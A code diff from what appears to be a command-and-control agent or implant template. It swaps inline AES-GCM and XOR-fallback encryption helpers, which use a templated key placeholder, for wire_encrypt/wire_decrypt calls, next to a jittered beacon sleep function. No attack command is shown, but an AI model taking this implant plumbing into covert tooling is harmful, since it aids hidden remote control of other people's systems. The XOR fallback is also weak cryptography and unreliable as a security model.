@@ -28,31 +28,10 @@ def _derive_aes_key(key):
     return hashlib.sha256(key).digest()
 
 def simple_encrypt(data: str) -> str:
-    key = b'{{ENCRYPTION_KEY}}'
-    try:
-        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
-        aes_key = _derive_aes_key(key)
-        nonce = os.urandom(12)
-        ct = AESGCM(aes_key).encrypt(nonce, data.encode('utf-8'), None)
-        return base64.b64encode(b'AES1' + nonce + ct).decode()
-    except ImportError:
-        encoded = data.encode('latin-1')
-        encrypted = bytes([encoded[i] ^ key[i % len(key)] for i in range(len(encoded))])
-        return base64.b64encode(encrypted).decode()
+    return wire_encrypt(data)
 
 def simple_decrypt(data: str) -> str:
-    key = b'{{ENCRYPTION_KEY}}'
-    raw = base64.b64decode(data.encode())
-    if raw[:4] == b'AES1':
-        try:
-            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
-            aes_key = _derive_aes_key(key)
-            pt = AESGCM(aes_key).decrypt(raw[4:16], raw[16:], None)
-            return pt.decode('utf-8')
-        except Exception:
-            pass
-    decrypted = bytes([raw[i] ^ key[i % len(key)] for i in range(len(raw))])
-    return decrypted.decode('latin-1')
+    return wire_decrypt(data)
 
 
 def calculate_sleep_time(base_interval: int, jitter_percent: int) -> float:
